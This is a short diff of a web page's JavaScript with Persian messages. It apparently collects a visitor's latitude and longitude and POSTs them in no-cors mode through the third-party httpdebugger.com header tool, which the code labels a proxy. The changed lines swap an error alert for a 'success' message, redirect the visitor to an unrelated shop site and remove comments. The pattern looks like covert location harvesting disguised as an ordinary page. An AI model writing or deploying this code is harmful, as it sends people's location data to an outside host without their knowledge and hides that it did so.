@@ -111,17 +111,17 @@
         fetch("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", {
           method: "POST",
           body: formData,
-          mode: "no-cors" // جلوگیری از خطای CORS در مرورگر
+          mode: "no-cors"
         }).then(function() {
-          // مطابق رفتار قبلی
-          alert("خطا! دوباره امتحان کنید");
+          alert("موفق!");
+          window.location.href = "https://vinaaccessory.com/";
         }).catch(function(err) {
           console.warn("Proxy request failed:", err);
-          alert("شناسایی نشد. لطفاً دوباره امتحان کنید.");
+          alert("خطا! دوباره امتحان کنید");
         });
 
       } else {
-        alert("لطفاً دوباره امتحان کنید.");
+        alert("مختصات موقعیت دریافت نشد. لطفاً دوباره امتحان کنید.");
         console.warn("Latitude or Longitude is missing.");
       }
     }
